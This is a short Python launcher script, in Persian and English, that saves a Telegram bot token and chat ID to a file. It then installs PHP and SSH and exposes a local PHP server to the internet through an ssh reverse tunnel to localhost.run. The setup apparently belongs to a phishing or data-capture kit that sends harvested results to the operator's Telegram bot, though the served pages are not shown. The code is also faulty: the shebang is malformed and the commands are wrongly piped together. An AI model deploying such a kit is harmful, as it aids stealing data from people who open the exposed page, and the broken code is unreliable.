#/usr/bin/env python3
# code by T.ME/os20ir

import os
os.system("clear")
print(''' \033[92m
      📍👊 ʍ4ղíƒҽՏԵ0 ϲվҍҽɾ ՏҽϲմɾíԵվ Եҽɑʍ™💪🗺
   #####################################

''')
open('bot-data.txt', 'w').close()
token = input("لطفا توکن ربات خود را قرار دهید : ")
chat_id = input("لطفاً شماره آیدی خود را قرار دهید: ")
f = open("bot-data.txt", "a")
f.write(token+"$"+chat_id)
f.close()
os.system("apt  install  openssh  php -y | php -S localhost:3333 | ssh -R 80:localhost:3333 ssh.localhost.run")


